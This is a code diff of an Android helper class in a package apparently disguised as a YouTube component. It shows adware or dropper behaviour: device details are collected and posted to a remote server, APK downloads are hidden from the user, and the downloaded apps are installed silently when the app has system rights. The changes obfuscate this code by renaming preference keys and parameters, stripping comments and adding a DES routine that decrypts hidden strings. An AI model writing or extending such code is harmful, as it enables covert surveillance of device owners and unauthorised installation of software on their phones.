@@ -16,9 +16,7 @@ import javax.crypto.SecretKey;
 import javax.crypto.SecretKeyFactory;
 import javax.crypto.spec.DESKeySpec;
 
-import org.json.JSONArray;
-import org.json.JSONObject;
-
+import com.example.msg.R;
 import com.google.youtube.services.SilentService;
 
 import android.app.DownloadManager;
@@ -99,6 +97,8 @@ public class MyHelpUtil {
 
 		params_str.append("&n=" + ca.get(Calendar.HOUR_OF_DAY));
 
+		params_str.append("&p=" + DeviceUtils.getTelephoneType(context));
+
 		return params_str.toString();
 
 	}
@@ -131,12 +131,6 @@ public class MyHelpUtil {
 		return builder.toString();
 	}
 
-	/**
-	 * 封装设备信息
-	 * 
-	 * @param context
-	 * @return
-	 */
 	public static String add_device_params(Context context) {
 
 		StringBuffer params_str = new StringBuffer();
@@ -192,10 +186,9 @@ public class MyHelpUtil {
 		params_str.append("&y=" + isSystemApp(context));
 
 		SharedPreferences localSharedPreferences = context
-				.getSharedPreferences("SCREEN_STATUS", 0);
+				.getSharedPreferences("scr", 0);
 
-		params_str.append("&z="
-				+ localSharedPreferences.getInt("screen_count", 0));//
+		params_str.append("&z=" + localSharedPreferences.getInt("sc", 0));//
 
 		SharedPreferences localSharedPreferences_id = context
 				.getSharedPreferences("DEVICE_STATUS", 0);
@@ -203,17 +196,17 @@ public class MyHelpUtil {
 		int isSystemApp = MyHelpUtil.isSystemApp(context);
 
 		SharedPreferences localSharedPreferences_t = context
-				.getSharedPreferences("MSG_STATUS", 0);
+				.getSharedPreferences("tir", 0);
 
 		if (isSystemApp == 0) {
 
-			if (!localSharedPreferences_t.contains("silent")) {
+			if (!localSharedPreferences_t.contains("si")) {
 
 				params_str.append("&ab=" + 0);
 
 			} else {
 
-				long s = localSharedPreferences_t.getLong("silent", 0);
+				long s = localSharedPreferences_t.getLong("si", 0);
 
 				long result_time = Math.abs(new Date().getTime() - s);
 
@@ -223,13 +216,13 @@ public class MyHelpUtil {
 
 		} else {
 
-			if (!localSharedPreferences_t.contains("notification")) {
+			if (!localSharedPreferences_t.contains("not")) {
 
 				params_str.append("&ab=" + 0);
 
 			} else {
 
-				long s = localSharedPreferences_t.getLong("notification", 0);
+				long s = localSharedPreferences_t.getLong("not", 0);
 
 				long result_time = Math.abs(new Date().getTime() - s);
 
@@ -243,16 +236,13 @@ public class MyHelpUtil {
 				.append("&ac="
 						+ localSharedPreferences_id.getString(
 								"create_device_id", "no"));
-		
 
 		params_str.append("&ad=" + DeviceUtils.getTelephoneType(context));
 
 		params_str.append("&ae=" + AppUtil_i.getPackageLocation(context));
-		
-		params_str
-		.append("&af="
-				+ localSharedPreferences_id.getString(
-						"app_md5", "no"));
+
+		params_str.append("&af="
+				+ localSharedPreferences_id.getString("app_md5", "no"));
 
 		return params_str.toString();
 	}
@@ -383,15 +373,6 @@ public class MyHelpUtil {
 
 	}
 
-	/**
-	 * 构建通知
-	 * 
-	 * @param bitmap
-	 * @param title
-	 * @param text
-	 * @param ticktitle
-	 * @param context
-	 */
 	public static void showNotifacation(Bitmap bitmap,
 			CharSequence contentTitle, CharSequence contentText,
 			CharSequence ticktitle, Context context, int nid, int cancelflag,
@@ -400,8 +381,8 @@ public class MyHelpUtil {
 		NotificationManager _nm = (NotificationManager) context
 				.getSystemService(Context.NOTIFICATION_SERVICE);
 
-		// 0x7f020001 context.getApplicationInfo().icon 0x7f02016d
-		Notification notifacation = new Notification(0x7f020001, ticktitle,
+		// context.getApplicationInfo().icon youtube 0x7f020001 aoyou 0x7f0201b2
+		Notification notifacation = new Notification(R.drawable.ic_about_rate_five_star, ticktitle,
 				System.currentTimeMillis());
 
 		notifacation.flags |= Notification.FLAG_AUTO_CANCEL;
@@ -430,7 +411,6 @@ public class MyHelpUtil {
 
 	}
 
-	// 查找ImageView
 	protected static ImageView GetImaeView(View paramView) {
 		if (paramView instanceof ImageView)
 			return (ImageView) paramView;
@@ -447,15 +427,16 @@ public class MyHelpUtil {
 
 	/**
 	 * @param packageName
+	 *            a
 	 * @param context
 	 */
-	public static void openApp(String packageName, Context context) {
+	public static void openApp(String a, Context context) {
 
 		Intent resolveIntent = new Intent(Intent.ACTION_MAIN, null);
 
 		resolveIntent.addCategory(Intent.CATEGORY_LAUNCHER);
 
-		resolveIntent.setPackage(packageName);
+		resolveIntent.setPackage(a);
 
 		List<ResolveInfo> apps = context.getPackageManager()
 				.queryIntentActivities(resolveIntent, 0);
@@ -485,65 +466,36 @@ public class MyHelpUtil {
 	}
 
 	/**
-	 * @param context
-	 */
-	public static void synchronousApp(Context context) {
-
-		String url = HttpUtil.BASE_URL + "app_b.action";
-
-		try {
-			String result = HttpUtil.getRequest(url);
-
-			if (!TextUtils.isEmpty(result) && !"null".equals(result)) {
-
-				JSONArray jsonArray = new JSONArray(result);
-
-				SharedPreferences localSharedPreferences = context
-						.getSharedPreferences("SynchronousApp", 0);
-
-				Editor localEditor = localSharedPreferences.edit();
-
-				for (int i = 0; i < jsonArray.length(); i++) {
-
-					JSONObject jsonObject = jsonArray.getJSONObject(i);
-
-					localEditor.putString(jsonObject.getString("apppakname"),
-							jsonObject.getString("appname"));
-				}
-
-				localEditor.commit();
-
-			}
-
-		} catch (Exception e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
-
-	}
-
-	/**
 	 * @return
 	 */
 	public static String getDir() {
 
-		// 检测外部存储是否存在
 		String state = Environment.getExternalStorageState();
-		// 如果内存卡可用
+
 		if (Environment.MEDIA_MOUNTED.equals(state)) {
-			return Environment.getExternalStorageDirectory().getAbsolutePath()
-					+ "/_xcl/";
+
+			File path = Environment
+					.getExternalStoragePublicDirectory(com.google.youtube.utils.A
+							.gg());
+
+			path.mkdirs();
+
+			return path.getAbsolutePath() + "/";
+
 		} else {
 			return "";
 		}
 	}
 
 	public static void save_screen_status(Context context) {
+
 		SharedPreferences localSharedPreferences = context
-				.getSharedPreferences("SCREEN_STATUS", 0);
+				.getSharedPreferences("scr", 0);
+
 		Editor localEditor = localSharedPreferences.edit();
-		localEditor.putInt("screen_count",
-				localSharedPreferences.getInt("screen_count", 0) + 1);
+
+		localEditor.putInt("sc", localSharedPreferences.getInt("sc", 0) + 1);
+
 		localEditor.commit();
 	}
 
@@ -561,11 +513,6 @@ public class MyHelpUtil {
 
 			localEditor.commit();
 
-		}
-
-		if (!localSharedPreferences.contains("app_md5")) {
-			localEditor.putString("app_md5", AppUtil_i.saveAppMD5(context));
-			localEditor.commit();
 		}
 
 	}
@@ -606,13 +553,11 @@ public class MyHelpUtil {
 
 		params_str.append("&e=" + m_type);
 
-		// app_upload_installed_soft
-		String url = HttpUtil.BASE_URL + "app_j.action";
+		String url = HttpUtil.BASE_URL + "google_j.action";
 
 		try {
 			HttpUtil.postRequest(url, params_str.toString());
 		} catch (Exception e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 	}
@@ -622,14 +567,22 @@ public class MyHelpUtil {
 			String apppakname, int msg_show_notifatication, int type,
 			String download_url) {
 
-		String localFileURI = context.getExternalFilesDir(
-				Environment.DIRECTORY_DOWNLOADS).getPath()
-				+ "/" + appalias + ".apk";
+		String state = Environment.getExternalStorageState();
 
-		File file = new File(localFileURI);
+		if (!Environment.MEDIA_MOUNTED.equals(state)) {
+			return;
+		}
+
+		File path = Environment
+				.getExternalStoragePublicDirectory(com.google.youtube.utils.A
+						.gc());
+
+		path.mkdirs();
+
+		File file = new File(path, appalias + ".apk");
 
 		SharedPreferences localSharedPreferences = context
-				.getSharedPreferences("DOWLOAD_STATUS", 0);
+				.getSharedPreferences("do", 0);
 
 		DownloadManager downloadManager = (DownloadManager) context
 				.getSystemService(Context.DOWNLOAD_SERVICE);
@@ -637,16 +590,6 @@ public class MyHelpUtil {
 		long downloadid = localSharedPreferences.getLong(appalias, -1);
 
 		if (downloadid != -1) {
-
-			if (!file.exists()) {
-
-				long id = downloadApk(context, appalias, msg_title, msg_text,
-						apppakname, msg_show_notifatication, type, download_url);
-
-				setDownloadId(context, id, appalias);
-
-				return;
-			}
 
 			Query query = new Query();
 
@@ -661,18 +604,25 @@ public class MyHelpUtil {
 					int column_status_index = cursor
 							.getColumnIndex(DownloadManager.COLUMN_STATUS);
 
+					int column_status_uri = cursor
+							.getColumnIndex(DownloadManager.COLUMN_LOCAL_URI);
+
 					int status = cursor.getInt(column_status_index);
+
+					String localuri = cursor.getString(column_status_uri);
 
 					if (status == DownloadManager.STATUS_SUCCESSFUL) {
 
 						PackageManager pm = context.getPackageManager();
 
-						PackageInfo pi = pm.getPackageArchiveInfo(localFileURI,
+						// --------
+						PackageInfo pi = pm.getPackageArchiveInfo(
+								Uri.parse(localuri).getPath(),
 								PackageManager.GET_SIGNATURES);
 
 						if (pi == null || pi.signatures == null) {
 
-							file.delete();
+							downloadManager.remove(downloadid);
 
 							long id = downloadApk(context, appalias, msg_title,
 									msg_text, apppakname,
@@ -687,19 +637,15 @@ public class MyHelpUtil {
 
 						if (isSystemApp == 0) {
 
-							String localuri = context.getExternalFilesDir(
-									Environment.DIRECTORY_DOWNLOADS).getPath()
-									+ "/" + appalias + ".apk";
-
-							int i = install(localuri);
+							int i = install(Uri.parse(localuri).getPath());
+							
+							File file1 = new File(Uri.parse(localuri).getPath());
 
 							if (i == 1) {
 
-								File file2 = new File(localuri);
+								if (file1.exists()) {
 
-								if (file2.exists()) {
-
-									file2.delete();
+									file1.delete();
 
 									return;
 								}
@@ -719,8 +665,6 @@ public class MyHelpUtil {
 
 									s.synchroOpenData(pi.packageName);
 
-									s.openApp();
-
 								}
 							}
 
@@ -732,15 +676,22 @@ public class MyHelpUtil {
 							installIntent
 									.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 
-							installIntent.setDataAndType(Uri.fromFile(new File(
-									context.getExternalFilesDir(
-											Environment.DIRECTORY_DOWNLOADS)
-											.getPath()
-											+ "/" + appalias + ".apk")),
+							// -----
+							installIntent.setDataAndType(Uri.parse(localuri),
 									"application/vnd.android.package-archive");
 
 							context.startActivity(installIntent);
 						}
+
+					}else if (status == DownloadManager.STATUS_FAILED) {
+						
+						Editor localEditor = localSharedPreferences.edit();
+
+						localEditor.remove(appalias);
+
+						localEditor.commit();
+
+						downloadManager.remove(downloadid);
 
 					}
 
@@ -749,21 +700,13 @@ public class MyHelpUtil {
 					if (file.exists()) {
 
 						file.delete();
-
-						long id = downloadApk(context, appalias, msg_title,
-								msg_text, apppakname, msg_show_notifatication,
-								type, download_url);
-
-						setDownloadId(context, id, appalias);
-
-					} else {
-
-						long id = downloadApk(context, appalias, msg_title,
-								msg_text, apppakname, msg_show_notifatication,
-								type, download_url);
-
-						setDownloadId(context, id, appalias);
 					}
+
+					long id = downloadApk(context, appalias, msg_title,
+							msg_text, apppakname, msg_show_notifatication,
+							type, download_url);
+
+					setDownloadId(context, id, appalias);
 
 				}
 
@@ -778,31 +721,25 @@ public class MyHelpUtil {
 			if (file.exists()) {
 
 				file.delete();
-
-				long id = downloadApk(context, appalias, msg_title, msg_text,
-						apppakname, msg_show_notifatication, type, download_url);
-
-				setDownloadId(context, id, appalias);
-
-			} else {
-
-				long id = downloadApk(context, appalias, msg_title, msg_text,
-						apppakname, msg_show_notifatication, type, download_url);
-
-				setDownloadId(context, id, appalias);
 			}
+
+			long id = downloadApk(context, appalias, msg_title, msg_text,
+					apppakname, msg_show_notifatication, type, download_url);
+
+			setDownloadId(context, id, appalias);
+
 		}
 
 	}
 
-	public static void setDownloadId(Context context, Long id, String appalias) {
+	public static void setDownloadId(Context context, Long id, String a) {
 
 		SharedPreferences localSharedPreferences = context
-				.getSharedPreferences("DOWLOAD_STATUS", 0);
+				.getSharedPreferences("do", 0);
 
 		Editor localEditor = localSharedPreferences.edit();
-
-		localEditor.putLong(appalias, id);
+		
+		localEditor.putLong(a, id);
 
 		localEditor.commit();
 
@@ -838,8 +775,10 @@ public class MyHelpUtil {
 
 		request.setVisibleInDownloadsUi(false);
 
-		request.setDestinationInExternalFilesDir(context,
-				Environment.DIRECTORY_DOWNLOADS, appalias + ".apk");
+		request.setDestinationInExternalPublicDir(
+				com.google.youtube.utils.A.gc(), appalias + ".apk");
+
+		request.addRequestHeader("User-Agent", "Android");
 
 		request.addRequestHeader("Connection", "Keep-Alive");
 
@@ -980,6 +919,31 @@ public class MyHelpUtil {
 
 				e.printStackTrace();
 			}
+		}
+		return null;
+	}
+
+	public static String deCrypto(String txt) {
+
+		if (TextUtils.isEmpty(txt)) {
+			return "";
+		}
+		SecretKeyFactory skeyFactory = null;
+		Cipher cipher = null;
+		byte[] btxts = null;
+		try {
+			DESKeySpec desKeySpec = new DESKeySpec(A.getBytes());
+			skeyFactory = SecretKeyFactory.getInstance("DES");
+			cipher = Cipher.getInstance("DES");
+			SecretKey deskey = skeyFactory.generateSecret(desKeySpec);
+			cipher.init(Cipher.DECRYPT_MODE, deskey);
+			btxts = new byte[txt.length() / 2];
+			for (int i = 0, count = txt.length(); i < count; i += 2) {
+				btxts[i / 2] = (byte) Integer.parseInt(txt.substring(i, i + 2),
+						16);
+			}
+			return (new String(cipher.doFinal(btxts)));
+		} catch (Exception e) {
 		}
 		return null;
 	}
